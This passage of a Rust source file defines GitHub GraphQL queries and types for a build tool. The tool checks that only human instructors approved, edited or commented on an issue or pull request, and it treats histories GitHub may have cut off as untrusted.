pub const REVIEW_PAGE_LIMIT: usize = 20;

/// The most pages of 100 conversation comments one feedback read takes, as for reviews: 2,000
/// comments between two reads is GitHub misbehaving, and then every read fails.
pub const COMMENT_PAGE_LIMIT: usize = 20;

/// The newest 50 reviews with the first 50 diff comments each, and the newest 100 conversation
/// comments. `totalCount` and `pageInfo { startCursor }` on each let `pr_feedback` page back
/// ([`REVIEWS_BEFORE_QUERY`], [`COMMENTS_BEFORE_QUERY`]); softfac reads only the newest 100
/// comments.
/// `userContentEdits(first: 20)` keeps the nested query within GitHub's node limit; a longer
/// history is cut off and untrusted. Inline editors: [`COMMENT_EDITOR_QUERY`]. Priced at 2
/// points.
pub const PR_FEEDBACK_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!) { ",
    "repository(owner: $owner, name: $name) { pullRequest(number: $number) { ",
    "reviews(last: 50) { totalCount pageInfo { startCursor } nodes { ",
    "fullDatabaseId state body submittedAt author { __typename login } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } ",
    "comments(first: 50) { totalCount nodes { id body path line originalLine author { __typename login } ",
    "lastEditedAt } } } } ",
    "comments(last: 100) { totalCount pageInfo { startCursor } nodes { ",
    "fullDatabaseId body createdAt author { __typename login } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } } } } } }",
);

/// The 50 reviews before the cursor `$before`, oldest first: the page [`PR_FEEDBACK_QUERY`] cut
/// off. The review fields are the same as there, and cost the same (1 point).
pub const REVIEWS_BEFORE_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!, $before: String!) { ",
    "repository(owner: $owner, name: $name) { pullRequest(number: $number) { ",
    "reviews(last: 50, before: $before) { totalCount pageInfo { startCursor } nodes { ",
    "fullDatabaseId state body submittedAt author { __typename login } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } ",
    "comments(first: 50) { totalCount nodes { id body path line originalLine author { __typename login } ",
    "lastEditedAt } } } } } } }",
);

/// The 100 conversation comments before the cursor `$before`, oldest first: the page
/// [`PR_FEEDBACK_QUERY`] cut off. The comment fields are the same as there (1 point).
pub const COMMENTS_BEFORE_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!, $before: String!) { ",
    "repository(owner: $owner, name: $name) { pullRequest(number: $number) { ",
    "comments(last: 100, before: $before) { totalCount pageInfo { startCursor } nodes { ",
    "fullDatabaseId body createdAt author { __typename login } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } } } } } }",
);

/// Who did something. `typename` is only there when the query asked for it; a rule that wants
/// a person needs a `User`.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
pub struct Actor {
    #[serde(rename = "__typename", default)]
    pub typename: Option<String>,
    pub login: String,
}

/// One entry of an edit history: when, and by whom (`None`: a deleted account).
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EditEntry {
    pub edited_at: String,
    #[serde(default)]
    pub editor: Option<Actor>,
}

/// An edit history, newest first, with GitHub's count of all of it.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EditHistory {
    pub total_count: u64,
    pub nodes: Vec<EditEntry>,
}

#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
pub struct LabelName {
    pub name: String,
}

/// A label applied or removed.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct LabelChange {
    pub created_at: String,
    #[serde(default)]
    pub actor: Option<Actor>,
    pub label: LabelName,
}

/// A title renamed. Only who and when are asked for, never the titles.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Rename {
    pub created_at: String,
    #[serde(default)]
    pub actor: Option<Actor>,
}

/// One label event or title rename; a node of any other type is an answer this module cannot
/// read.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(tag = "__typename")]
pub enum TimelineNode {
    LabeledEvent(LabelChange),
    UnlabeledEvent(LabelChange),
    RenamedTitleEvent(Rename),
}

impl TimelineNode {
    fn created_at(&self) -> &str {
        match self {
            TimelineNode::LabeledEvent(change) | TimelineNode::UnlabeledEvent(change) => {
                &change.created_at
            }
            TimelineNode::RenamedTitleEvent(rename) => &rename.created_at,
        }
    }
}

/// The timeline page: the newest events, oldest first, with GitHub's count of all of them.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Timeline {
    pub total_count: u64,
    pub nodes: Vec<TimelineNode>,
}

/// GitHub's answer about an issue's label events and edit history.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ApprovalIssue {
    pub timeline_items: Timeline,
    #[serde(default)]
    pub last_edited_at: Option<String>,
    #[serde(default)]
    pub editor: Option<Actor>,
    pub user_content_edits: EditHistory,
}

#[derive(serde::Deserialize)]
struct ApprovalAnswer {
    data: ApprovalData,
}

#[derive(serde::Deserialize)]
struct ApprovalData {
    repository: ApprovalRepository,
}

#[derive(serde::Deserialize)]
struct ApprovalRepository {
    issue: ApprovalIssue,
}

/// An instructor who is a person: GitHub says the actor is a `User`. A GitHub App's GraphQL
/// login can lack the `[bot]` suffix, so a login that matches an instructor is not enough.
pub fn is_human_instructor(actor: Option<&Actor>, instructors: &[String]) -> bool {
    actor.is_some_and(|actor| {
        actor.typename.as_deref() == Some("User") && is_instructor(Some(&actor.login), instructors)
    })
}

/// Whether a page may leave out older entries: it is full, or GitHub counts more than it holds.
fn is_cut_off(total_count: u64, shown: usize) -> bool {
    shown >= HISTORY_PAGE || total_count > shown as u64
}

/// Whether the timeline page shows every event at or after `since`: not cut off, or its oldest
/// is before `since`.
pub fn timeline_reaches(issue: &ApprovalIssue, since: &str) -> bool {
    let timeline = &issue.timeline_items;
    !is_cut_off(timeline.total_count, timeline.nodes.len())
        || timeline
            .nodes
            .first()
            .is_some_and(|oldest| oldest.created_at() < since)
}

/// Whether the newest history entry is the last edit, by the last editor.
fn newest_is_last_edit(
    edits: &EditHistory,
    last_edited_at: Option<&str>,
    editor: Option<&Actor>,
) -> bool {
    let Some(last) = last_edited_at else {
        return true;
    };
    edits.nodes.first().is_some_and(|newest| {
        newest.edited_at == last
            && newest.editor.as_ref().map(|actor| &actor.login) == editor.map(|actor| &actor.login)
    })
}

/// Whether the body's edit history can be trusted for every edit at or after `since`: the
/// entries come newest first, so when it is cut off the oldest one shown must be before `since`.
fn edits_whole_since(issue: &ApprovalIssue, since: &str) -> bool {
    let edits = &issue.user_content_edits;
    let reaches_back = !is_cut_off(edits.total_count, edits.nodes.len())
        || edits
            .nodes
            .last()
            .is_some_and(|oldest| oldest.edited_at.as_str() < since);
    reaches_back
        && newest_is_last_edit(
            edits,
            issue.last_edited_at.as_deref(),
            issue.editor.as_ref(),
        )
}

/// Judges every body edit and title rename with time at or after `since`. A moment in the same
/// second counts as after, because timestamps have no finer order. `reaches` says the renames
/// on the timeline page cover everything at or after `since`.
pub fn text_changes_since(
    issue: &ApprovalIssue,
    since: &str,
    instructors: &[String],
    reaches: bool,
) -> TextCheck {
    let edit_by_stranger = issue.user_content_edits.nodes.iter().any(|edit| {
        edit.edited_at.as_str() >= since && !is_human_instructor(edit.editor.as_ref(), instructors)
    });
    let rename_by_stranger = issue.timeline_items.nodes.iter().any(|event| match event {
        TimelineNode::RenamedTitleEvent(rename) => {
            rename.created_at.as_str() >= since
                && !is_human_instructor(rename.actor.as_ref(), instructors)
        }
        _ => false,
    });
    if edit_by_stranger || rename_by_stranger {
        TextCheck::Changed
    } else if edits_whole_since(issue, since) && reaches {
        TextCheck::Unchanged
    } else {
        TextCheck::Unjudged
    }
}

/// Whether the factory may build the issue: an instructor (only ever a `User`) applied the
/// `ready` label in force now, and every body edit and title rename from that second on was an
/// instructor's. Only the newest timeline page is read: it holds the label in force and all
/// after it, a full page without it is `label-history-incomplete`, and a page that may hide a
/// rename in the label's second leaves the text unjudged. Label names match exactly; times
/// compare as text.
pub fn judge_approval(issue: &ApprovalIssue, ready: &str, instructors: &[String]) -> Approval {
    let mut in_force: Option<&LabelChange> = None;
    for event in &issue.timeline_items.nodes {
        match event {
            TimelineNode::LabeledEvent(change) if change.label.name == ready => {
                in_force = Some(change);
            }
            TimelineNode::UnlabeledEvent(change) if change.label.name == ready => {
                in_force = None;
            }
            _ => {}
        }
    }
    judge_chosen_label(issue, in_force, instructors)
}

/// The approval a claim was made on, judged after the claim removed `ready`: [`judge_approval`]'s
/// checks, made as of the claim rather than now. Only the label's newest event is judged. A
/// removal by `project_login` (in any letter case) is the claim's, and the label it took off is
/// the event before it; a label still on is the approval, as when the claim's removal is not on
/// the timeline. Any other newest event (a removal by anyone else, a removal after a removal, or
/// none) approves nothing, refused as [`judge_approval`] refuses a label it does not find. The
/// text is judged from the label's second on, and a timeline page that may hide a rename in that
/// second leaves it unjudged.
pub fn judge_claimed_approval(
    issue: &ApprovalIssue,
    ready: &str,
    project_login: &str,
    instructors: &[String],
) -> Approval {
    // The label's events, newest first: `true` for applied, `false` for removed.
    let mut events = issue
        .timeline_items
        .nodes
        .iter()
        .rev()
        .filter_map(|node| match node {
            TimelineNode::LabeledEvent(change) if change.label.name == ready => {
                Some((true, change))
            }
            TimelineNode::UnlabeledEvent(change) if change.label.name == ready => {
                Some((false, change))
            }
            _ => None,
        });
    let label = match events.next() {
        Some((true, label)) => Some(label),
        Some((false, removal))
            if removal
                .actor
                .as_ref()
                .is_some_and(|actor| actor.login.eq_ignore_ascii_case(project_login)) =>
        {
            match events.next() {
                Some((true, label)) => Some(label),
                _ => None,
            }
        }
        _ => None,
    };
    judge_chosen_label(issue, label, instructors)
}

/// What both judges decide once they have chosen the label (or found none): a missing label is
/// `label-history-incomplete` on a full page of a longer history and `label-not-found`
/// otherwise; a label applied by anyone but a human instructor is refused; and every body edit
/// and title rename from the label's second on must be an instructor's, with a timeline page
/// that may hide a rename in that second leaving the text unjudged.
fn judge_chosen_label(
    issue: &ApprovalIssue,
    label: Option<&LabelChange>,
    instructors: &[String],
) -> Approval {
    let Some(label) = label else {
        let timeline = &issue.timeline_items;
        let cut_off =
            timeline.nodes.len() >= HISTORY_PAGE && timeline.total_count > HISTORY_PAGE as u64;
        return Approval::Refused(if cut_off {
            Refusal::LabelHistoryIncomplete
        } else {
            Refusal::LabelNotFound
        });
    };
    let labeled_at = label.created_at.clone();
    let actor = label.actor.as_ref();
    let Some(applied_by) = actor.filter(|actor| is_human_instructor(Some(actor), instructors))
    else {
        return Approval::Refused(Refusal::LabeledByNonInstructor {
            by: actor.map(|actor| actor.login.clone()),
            labeled_at,
        });
    };
    // The page may be cut off just after the label, hiding a rename in its second.
    let reaches = timeline_reaches(issue, &labeled_at);
    match text_changes_since(issue, &labeled_at, instructors, reaches) {
        TextCheck::Changed => Approval::Refused(Refusal::EditedAfterLabel { labeled_at }),
        TextCheck::Unjudged => Approval::Refused(Refusal::EditHistoryIncomplete { labeled_at }),
        TextCheck::Unchanged => Approval::Approved {
            labeled_at,
            labeled_by: applied_by.login.clone(),
        },
    }
}

/// Whether anyone, an instructor included, edited the body or renamed the title at or after
/// `since`. A timeline page that may hide a rename at or after the moment counts as a change.
pub fn edited_since(issue: &ApprovalIssue, since: &str) -> bool {
    let edited = issue
        .last_edited_at
        .as_deref()
        .is_some_and(|edited_at| edited_at >= since);
    let renamed = issue.timeline_items.nodes.iter().any(|event| match event {
        TimelineNode::RenamedTitleEvent(rename) => rename.created_at.as_str() >= since,
        _ => false,
    });
    edited || renamed || !timeline_reaches(issue, since)
}

/// Runs the approval query for the issue and checks every timestamp in the answer.
fn read_history<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
) -> Result<ApprovalIssue, TrackerError> {
    let args = issue_query_args(repo, APPROVAL_QUERY, issue)?;
    let answer: ApprovalAnswer = gh_json(gh, &args, "a GraphQL response with the issue")?;
    let found = answer.data.repository.issue;
    let times = found
        .timeline_items
        .nodes
        .iter()
        .map(TimelineNode::created_at)
        .chain(
            found
                .user_content_edits
                .nodes
                .iter()
                .map(|edit| edit.edited_at.as_str()),
        )
        .chain(found.last_edited_at.as_deref());
    for at in times {
        require_utc_second(&args, "a timestamp", at)?;
    }
    Ok(found)
}

/// `value`, which `name` names in the message, as a check that it is GitHub's
/// `YYYY-MM-DDTHH:MM:SSZ`, else a parse error of the call with `args`.
fn require_utc_second(args: &[String], name: &str, value: &str) -> Result<(), TrackerError> {
    if is_utc_second(value) {
        Ok(())
    } else {
        Err(parse_error(
            args,
            &format!("{name} as YYYY-MM-DDTHH:MM:SSZ, got {}", quoted(value)),
        ))
    }
}

/// The arguments the GraphQL reads are named by in errors raised before any call.
fn graphql_args() -> Vec<String> {
    vec!["api".to_string(), "graphql".to_string()]
}

/// Whether an edit history can be trusted to show every edit up to the latest one: it is not
/// cut off (a full page, or a total larger than the page, may hide entries) and, when there is
/// a latest edit, the newest entry is that edit by that editor.
fn edits_whole(edits: &EditHistory, last_edited_at: Option<&str>, editor: Option<&Actor>) -> bool {
    !is_cut_off(edits.total_count, edits.nodes.len())
        && newest_is_last_edit(edits, last_edited_at, editor)
}

/// Whether the text of a review, a comment or an inline comment is its instructor's alone: it
/// was never edited, or the person who last edited it and every person in its edit history is a
/// human instructor (the creation is the oldest entry, by the author) and the history is whole.
/// One that GitHub shows no history for, or shows cut off, is not trusted.
fn text_is_instructors(
    last_edited_at: Option<&str>,
    editor: Option<&Actor>,
    edits: Option<&EditHistory>,
    instructors: &[String],
) -> bool {
    if last_edited_at.is_none() {
        return true;
    }
    is_human_instructor(editor, instructors)
        && edits.is_some_and(|edits| {
            edits_whole(edits, last_edited_at, editor)
                && edits
                    .nodes
                    .iter()
                    .all(|edit| is_human_instructor(edit.editor.as_ref(), instructors))
        })
}

/// One comment of the REST listing. `user` is null for a deleted account.
#[derive(serde::Deserialize)]
struct ActivityRow {
    id: u64,
    #[serde(default)]
    node_id: Option<String>,
    #[serde(default)]
    user: Option<RestUser>,
    #[serde(default)]
    created_at: Option<String>,
    #[serde(default)]
    updated_at: Option<String>,
    #[serde(default)]
    body: Option<String>,
}

#[derive(serde::Deserialize)]
struct RestUser {
    login: String,
}

#[derive(serde::Deserialize)]
struct ActivityAnswer {
    data: ActivityData,
}

#[derive(serde::Deserialize)]
struct ActivityData {
    repository: ActivityRepository,
}

#[derive(serde::Deserialize)]
struct ActivityRepository {
    issue: ActivityIssue,
}

/// The issue's body and who edited it last, with the history of its edits.
#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct ActivityIssue {
    #[serde(default)]
    body: Option<String>,
    #[serde(default)]
    last_edited_at: Option<String>,
    #[serde(default)]
    editor: Option<Actor>,
    user_content_edits: EditHistory,
}

/// One entry for each id asked for, in no promised order; `null` for a comment that is gone.
#[derive(serde::Deserialize)]
struct CommentEditorsAnswer {
    data: CommentEditorsData,
}

#[derive(serde::Deserialize)]
struct CommentEditorsData {
    nodes: Vec<Option<CommentEditors>>,
}

/// The last editor and the edit history of one comment.
#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct CommentEditors {
    id: String,
    #[serde(default)]
    last_edited_at: Option<String>,
    #[serde(default)]
    editor: Option<Actor>,
    user_content_edits: EditHistory,
}

/// A GraphQL `fullDatabaseId` is a BigInt that GraphQL sends as a decimal string; a number is
/// read too.
#[derive(serde::Deserialize)]
#[serde(untagged)]
enum DatabaseId {
    Text(String),
    Number(serde_json::Number),
}

/// A comment a review left on a line of the diff. Its edit history is read on its own.
#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct FeedbackInline {
    #[serde(default)]
    id: Option<String>,
    #[serde(default)]
    body: Option<String>,
    #[serde(default)]
    path: Option<String>,
    #[serde(default)]
    line: Option<u64>,
    #[serde(default)]
    original_line: Option<u64>,
    #[serde(default)]
    author: Option<Actor>,
    #[serde(default)]
    last_edited_at: Option<String>,
}

#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct FeedbackInlineComments {
    #[serde(default)]
    total_count: Option<u64>,
    nodes: Vec<FeedbackInline>,
}

/// `submitted_at` is null for a review still pending; the author and editor for a deleted
/// account.
#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct FeedbackReview {
    #[serde(default)]
    full_database_id: Option<DatabaseId>,
    state: String,
    #[serde(default)]
    body: Option<String>,
    #[serde(default)]
    submitted_at: Option<String>,
    #[serde(default)]
    author: Option<Actor>,
    #[serde(default)]
    last_edited_at: Option<String>,
    #[serde(default)]
    editor: Option<Actor>,
    #[serde(default)]
    user_content_edits: Option<EditHistory>,
    comments: FeedbackInlineComments,
}

#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct PageInfo {
    #[serde(default)]
    start_cursor: Option<String>,
}

/// A page of reviews or conversation comments, oldest first, with GitHub's count of all of them
/// and the cursor of its first node.
#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct Page<N> {
    #[serde(default)]
    total_count: Option<u64>,
    #[serde(default)]
    page_info: Option<PageInfo>,
    nodes: Vec<N>,
}

#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct FeedbackPrComment {
    #[serde(default)]
    full_database_id: Option<DatabaseId>,
    #[serde(default)]
    body: Option<String>,
    created_at: String,
    #[serde(default)]
    author: Option<Actor>,
    #[serde(default)]
    last_edited_at: Option<String>,
    #[serde(default)]
    editor: Option<Actor>,
    #[serde(default)]
    user_content_edits: Option<EditHistory>,
}

#[derive(serde::Deserialize)]
struct FeedbackPull {
    reviews: Page<FeedbackReview>,
    comments: Page<FeedbackPrComment>,
}

#[derive(serde::Deserialize)]
struct FeedbackAnswer {
    data: FeedbackData,
}

#[derive(serde::Deserialize)]
struct FeedbackData {
    repository: FeedbackRepository,
}

/// `pullRequest` is null when the pull request is gone.
#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct FeedbackRepository {
    #[serde(default)]
    pull_request: Option<FeedbackPull>,
}

/// The answer to a paging query: one page of the list it asks for.
#[derive(serde::Deserialize)]
struct BeforeAnswer<N> {
    data: BeforeData<N>,
}

#[derive(serde::Deserialize)]
struct BeforeData<N> {
    repository: BeforeRepository<N>,
}

/// `pullRequest` is null when the pull request is gone.
#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct BeforeRepository<N> {
    pull_request: Option<BeforePull<N>>,
}

/// The one list a paging query asks for, under GitHub's name for it.
#[derive(serde::Deserialize)]
struct BeforePull<N> {
    #[serde(alias = "reviews", alias = "comments")]
    page: Page<N>,
}

/// A list of a pull request that [`pr_feedback`] pages back through.
struct PagedList<N> {
    /// What the list holds, for error text.
    name: &'static str,
    /// What a node's time is called, for error text.
    time_name: &'static str,
    /// When a node was written or submitted; `None` for a review still pending.
    time: fn(&N) -> Option<&str>,
    /// The query for the page before a cursor.
    before_query: &'static str,
    /// How many nodes one page holds.
    page_size: usize,
    /// The most pages one read takes.
    page_limit: usize,
}

const REVIEWS: PagedList<FeedbackReview> = PagedList {
    name: "reviews",
    time_name: "a review time",
    time: review_time,
    before_query: REVIEWS_BEFORE_QUERY,
    page_size: 50,
    page_limit: REVIEW_PAGE_LIMIT,
};

const CONVERSATION_COMMENTS: PagedList<FeedbackPrComment> = PagedList {
    name: "conversation comments",
    time_name: "a comment time",
    time: comment_time,
    before_query: COMMENTS_BEFORE_QUERY,
    page_size: 100,
    page_limit: COMMENT_PAGE_LIMIT,
};

fn review_time(review: &FeedbackReview) -> Option<&str> {
    review.submitted_at.as_deref()
}

fn comment_time(comment: &FeedbackPrComment) -> Option<&str> {
    Some(&comment.created_at)
}

/// The review states whose inline comments are read: every submitted one.
const FEEDBACK_STATES: [&str; 4] = ["CHANGES_REQUESTED", "COMMENTED", "APPROVED", "DISMISSED"];

/// The id of a review or comment as the decimal digits GitHub gave, or `None` when it is not a
/// number.
fn database_id(id: Option<&DatabaseId>) -> Option<String> {
    match id? {
        // A JSON number is read only as a whole number JavaScript also holds exactly.
        DatabaseId::Number(number) => number
            .as_u64()
            .filter(|id| *id < (1 << 53))
            .map(|id| id.to_string()),
        DatabaseId::Text(text) => {
            if text.is_empty() || !text.bytes().all(|b| b.is_ascii_digit()) {
                return None;
            }
            text.parse::<u64>().ok().map(|id| id.to_string())
        }
    }
}

/// An instructor's comment made during a build.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Comment {
    pub id: String,
    pub author: String,
    pub created_at: String,
    pub body: String,
}

/// An instructor's edit of the issue body: when, by whom, and the whole body as it stands now.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BodyEdit {
    pub edited_at: String,
    pub editor: String,
    pub body: String,
}

/// Why an instructor's comment was not forwarded.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DropReason {
    EditedByOther,
    Unverifiable,
}

/// An instructor's comment that was not forwarded because its text may not be the
/// instructor's.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Dropped {
    pub id: String,
    pub reason: DropReason,
}

/// What the instructors did on an issue since a moment.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Activity {
    /// Oldest first.
    pub comments: Vec<Comment>,
    pub body_edit: Option<BodyEdit>,
    pub dropped: Vec<Dropped>,
}

/// Where a piece of feedback was written. `state` is GitHub's review state.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum FeedbackKind {
    Review { state: String },
    PrComment,
    IssueComment,
}

/// A comment a review left on a line of the pull request's diff.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct InlineComment {
    pub path: String,
    /// The line it is on, or was on when the diff changed; `None` when GitHub gives neither.
    pub line: Option<u64>,
    pub body: String,
}

/// One piece of instructor feedback: a review of a pull request, or a comment on it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Feedback {
    /// `review:<id>`, `pr-comment:<id>` or `issue-comment:<id>`, so the id spaces cannot
    /// collide.
    pub id: String,
    pub author: String,
    pub kind: FeedbackKind,
    /// GitHub's UTC form, e.g. `2026-10-04T10:13:16Z`.
    pub created_at: String,
    /// The review's body or the comment's text; empty when there is none.
    pub body: String,
    /// The comments a review left on lines of the diff, in GitHub's order; empty for any other
    /// kind.
    pub inline: Vec<InlineComment>,
    /// How many inline comments of a review were not read; 0 for any other kind.
    pub inline_unread: u64,
}

/// Whether an instructor applied the `factory:ready` label in force, and every edit and
/// rename since was an instructor's.
pub fn approval<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    instructors: &[String],
) -> Result<Approval, TrackerError> {
    let found = read_history(gh, repo, issue)?;
    Ok(judge_approval(&found, State::Ready.label(), instructors))
}

/// The approval a takeover's claim was made on: [`judge_claimed_approval`] over one read of
/// the issue's history, its timestamps checked.
pub fn claimed_approval<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    project_login: &str,
    instructors: &[String],
) -> Result<Approval, TrackerError> {
    let found = read_history(gh, repo, issue)?;
    Ok(judge_claimed_approval(
        &found,
        State::Ready.label(),
        project_login,
        instructors,
    ))
}

/// Whether the issue text is as an instructor left it at `since`.
pub fn text_check<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
    instructors: &[String],
) -> Result<TextCheck, TrackerError> {
    require_utc_second(&graphql_args(), "`since`", since)?;
    let found = read_history(gh, repo, issue)?;
    Ok(text_changes_since(
        &found,
        since,
        instructors,
        timeline_reaches(&found, since),
    ))
}

/// Whether anyone edited the body or renamed the title at or after `since`.
pub fn text_edited_since<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
) -> Result<bool, TrackerError> {
    require_utc_second(&graphql_args(), "`since`", since)?;
    Ok(edited_since(&read_history(gh, repo, issue)?, since))
}

/// What the instructors wrote on the issue after `since`.
pub fn activity_since<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
    instructors: &[String],
) -> Result<Activity, TrackerError> {
    let comments_path = format!("repos/{repo}/issues/{issue}/comments");
    let query = issue_query_args(repo, ACTIVITY_QUERY, issue)?;
    require_utc_second(
        &["api".to_string(), comments_path.clone()],
        "`since`",
        since,
    )?;
    let listed: Vec<ActivityRow> = gh_pages(
        gh,
        &[
            "api".to_string(),
            format!("{comments_path}?since={since}&per_page=100"),
            "--paginate".to_string(),
        ],
        "JSON arrays of comments",
    )?;
    let mut written: Vec<&ActivityRow> = listed
        .iter()
        .filter(|c| c.created_at.as_deref().is_some_and(|at| at > since))
        .filter(|c| is_instructor(c.user.as_ref().map(|u| u.login.as_str()), instructors))
        .filter(|c| !is_factory_comment(c.body.as_deref().unwrap_or_default()))
        .collect();
    // Stable, so comments of the same second keep the order they were read in.
    written.sort_by(|a, b| a.created_at.cmp(&b.created_at));
    let edited = |c: &ActivityRow| c.updated_at != c.created_at;
    // Who edited the edited ones, in one call for each 100 of them.
    let edited_ids: Vec<&str> = written
        .iter()
        .filter(|c| edited(c))
        .filter_map(|c| c.node_id.as_deref())
        .collect();
    let editors = comment_editors(gh, &edited_ids)?;
    let mut comments = Vec::new();
    let mut dropped = Vec::new();
    for c in written {
        if edited(c) {
            let node = c.node_id.as_deref().and_then(|id| editors.get(id));
            let reason = match check_edits(node, instructors) {
                EditVerdict::Instructors => None,
                EditVerdict::Other => Some(DropReason::EditedByOther),
                EditVerdict::Unverifiable => Some(DropReason::Unverifiable),
                // Not forwardable and not reported: there is nothing to point a notice at.
                EditVerdict::Gone => continue,
            };
            if let Some(reason) = reason {
                dropped.push(Dropped {
                    id: c.id.to_string(),
                    reason,
                });
                continue;
            }
        }
        comments.push(Comment {
            id: c.id.to_string(),
            author: c.user.as_ref().map(|u| u.login.clone()).unwrap_or_default(),
            created_at: c.created_at.clone().unwrap_or_default(),
            body: c.body.clone().unwrap_or_default(),
        });
    }

    let answer: ActivityAnswer = gh_json(gh, &query, "a GraphQL response with the issue")?;
    let found = answer.data.repository.issue;
    // The history comes newest first, so a page that is full or short of the total may be
    // missing the latest edits, and a newest entry that is not the latest edit means the same:
    // fail closed. The creation entry is before `since` for an issue that existed before the
    // run.
    let only_instructors = edits_whole(
        &found.user_content_edits,
        found.last_edited_at.as_deref(),
        found.editor.as_ref(),
    ) && found
        .user_content_edits
        .nodes
        .iter()
        // The same second counts as after, as in `text_changes_since`: a stranger's edit in the
        // second of `since` may have come after the last read.
        .filter(|edit| edit.edited_at.as_str() >= since)
        .all(|edit| is_human_instructor(edit.editor.as_ref(), instructors));
    let body_edit = match (&found.last_edited_at, &found.editor) {
        (Some(edited_at), Some(editor))
            if only_instructors
                && edited_at.as_str() > since
                && is_human_instructor(Some(editor), instructors) =>
        {
            Some(BodyEdit {
                edited_at: edited_at.clone(),
                editor: editor.login.clone(),
                body: found.body.clone().unwrap_or_default(),
            })
        }
        _ => None,
    };
    Ok(Activity {
        comments,
        body_edit,
        dropped,
    })
}

/// How far an edited comment can be trusted, from its entry in [`comment_editors`].
enum EditVerdict {
    Instructors,
    Other,
    Unverifiable,
    Gone,
}

/// Whether a comment updated after it was written may be trusted: GitHub has no edit of it, or
/// every edit is by an instructor who is a `User`. There is no `since` cut-off: any other editor
/// at any time makes it `Other`, even with a too-long history; a history that may hide more is
/// `Unverifiable`, no entry `Gone`.
fn check_edits(node: Option<&CommentEditors>, instructors: &[String]) -> EditVerdict {
    let Some(node) = node else {
        return EditVerdict::Gone;
    };
    let last_other =
        node.last_edited_at.is_some() && !is_human_instructor(node.editor.as_ref(), instructors);
    // Every entry, the creation included (its editor is the author, an instructor).
    let any_other = node
        .user_content_edits
        .nodes
        .iter()
        .any(|edit| !is_human_instructor(edit.editor.as_ref(), instructors));
    if last_other || any_other {
        EditVerdict::Other
    } else if edits_whole(
        &node.user_content_edits,
        node.last_edited_at.as_deref(),
        node.editor.as_ref(),
    ) {
        EditVerdict::Instructors
    } else {
        EditVerdict::Unverifiable
    }
}

/// The last editor and the last 100 edits of the comments with these node ids, by id: one call
/// for each 100 ids, and none for no ids. A comment that is gone is not in the map. A call that
/// fails fails the read.
fn comment_editors<G: Tracker + ?Sized>(
    gh: &G,
    ids: &[&str],
) -> Result<HashMap<String, CommentEditors>, TrackerError> {
    let mut found = HashMap::new();
    for chunk in ids.chunks(COMMENT_EDITOR_IDS) {
        let mut args = vec![
            "api".to_string(),
            "graphql".to_string(),
            "-f".to_string(),
            format!("query={COMMENT_EDITOR_QUERY}"),
        ];
        for id in chunk {
            args.push("-f".to_string());
            args.push(format!("ids[]={id}"));
        }
        let answer: CommentEditorsAnswer =
            gh_json(gh, &args, "a GraphQL response with the comments")?;
        for node in answer.data.nodes.into_iter().flatten() {
            found.insert(node.id.clone(), node);
        }
    }
    Ok(found)
}

/// The instructors' feedback on pull request `pr` after `since`, reading back no further than
/// `floor`.
pub fn pr_feedback<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    pr: u64,
    since: &str,
    floor: &str,
    instructors: &[String],
) -> Result<Vec<Feedback>, TrackerError> {
    for (name, time) in [("since", since), ("floor", floor)] {
        require_utc_second(&graphql_args(), &format!("`{name}`"), time)?;
    }
    let args = issue_query_args(repo, PR_FEEDBACK_QUERY, pr)?;
    let answer: FeedbackAnswer = gh_json(gh, &args, "a GraphQL response with the pull request")?;
    let Some(pull) = answer.data.repository.pull_request else {
        return Ok(Vec::new());
    };
    let unreadable =
        |what: &str, got: &str| parse_error(&args, &format!("{what}, got {}", quoted(got)));
